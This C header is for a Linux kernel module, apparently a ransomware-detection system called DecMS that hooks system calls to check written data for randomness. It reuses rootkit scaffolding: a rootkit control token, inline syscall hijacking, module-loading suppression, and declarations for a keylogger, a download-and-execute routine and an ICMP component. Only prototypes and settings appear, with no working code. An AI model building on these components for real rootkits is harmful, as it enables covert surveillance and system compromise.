#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/time.h>
#include <linux/fs.h>

#define DECMS_TAB_MAX   4096

#define NOT_OPEN        0
#define NEWLY_OPEN      1
#define SHOULD_SAVE     2
#define SHOULD_NOT_SAVE 3

//Current, we only support the following combos:
//1.  MAX_DEPTH 1
//    BUF_SIZE 4096
//
//2.  MAX_DEPTH 2
//    BUF_SIZE 4096
//
//3.  MAX_DEPTH 1
//    BUF_SIZE 16
//
#define MAX_DEPTH 2
#define BUF_SIZE 4096
#define TRAINING_SET 0
#define DIVERSE_TS 0
#define BINARY_TS 1
#define COMPRESSED_TS 2
//set the following false if we want to test
//the latency of DecMS without accounting for
//the randomness checks
#define CHECK_RAND 1

#define AUTO_ADJUST 0        // if the buffer size is less than BUF_SIZ, selecte the next largest 
                             // buffer defined... WIP
#define SAVE_SINGLE_PASS 1   //set to 1 if we only save the file once if randmoness is detected
#define BACKUP_ENABLED 1
#define THREAD_LOGGING 1
//save files opened with the O_WRONLY flag fopen() 
#define SAVE_O_WRONLY 1

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
#include <generated/autoconf.h>
#else
#include <linux/autoconf.h>
#endif

#define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
#define __DEBUG__ 1             // General debugging statements
#define __DEBUG_HOOK__ 0        // Debugging of inline function hooking
#define __DEBUG_KEY__ 0         // Debugging of user keypresses
#define __DEBUG_RW__ 0          // Debugging of sys_read and sys_write hooks
#define __DEBUG_TS__ 0          // Debugging of sys_read and sys_write hooks
#define __DEBUG_NO_MATH__ 0     // Debugging of no_math libraries
#define __DEBUG_RAND_TEST__ 0   // Debugging of rand_test libraries
#define __DEBUG_LOG__  0        // Debug messages for log file

#if __DEBUG__
# define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG(fmt, ...)
#endif

#if __DEBUG_HOOK__
# define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_HOOK(fmt, ...)
#endif

#if __DEBUG_KEY__
# define DEBUG_KEY(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_KEY(fmt, ...)
#endif

#if __DEBUG_RW__
# define DEBUG_RW(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_RW(fmt, ...)
#endif

#if __DEBUG_TS__
# define DEBUG_TS(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_TS(fmt, ...)
#endif

#if __DEBUG_NO_MATH__
# define DEBUG_NO_MATH(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_NO_MATH(fmt, ...)
#endif

#if __DEBUG_RAND_TEST__
# define DEBUG_RAND_TEST(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_RAND_TEST(fmt, ...)
#endif

#if __DEBUG_LOG__
# define DEBUG_LOG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_LOG(fmt, ...)
#endif

extern unsigned long *sys_call_table_decms;


char *strnstr(const char *haystack, const char *needle, size_t n);
void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
void *memstr(const void *haystack, const char *needle, size_t size);

//helper functions for hooking
void log_fd_ts(char *, struct timespec *ts);
void log_fd_info(int fd);
void log_str_info(char *);
void log_crypto_hash(const char*, int);

void hijack_start(void *target, void *new);
void hijack_pause(void *target);
void hijack_resume(void *target);
void hijack_stop(void *target);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
unsigned long get_symbol(char *name);
#endif

void disable_module_loading(void);
void enable_module_loading(void);

#if defined(_CONFIG_X86_64_)
extern unsigned long *ia32_sys_call_table;
#endif

#if defined(_CONFIG_KEYLOGGER_)
void keylogger_init(void);
void keylogger_exit(void);
#endif

#if defined(_CONFIG_HOOKRW_)
void hookrw_init(void);
void hookrw_exit(void);
#endif

#if defined(_CONFIG_DLEXEC_)
void dlexec_init(void);
void dlexec_exit(void);
int dlexec_queue(char *path, unsigned int ip, unsigned short port, unsigned int retry, unsigned int delay);
#endif

#if defined(_CONFIG_ICMP_)
void icmp_init (void);
void icmp_exit (void);
#endif

#if defined(_CONFIG_HOOKTS_)
void hookts_init(void);
void hookts_exit(void);
#endif
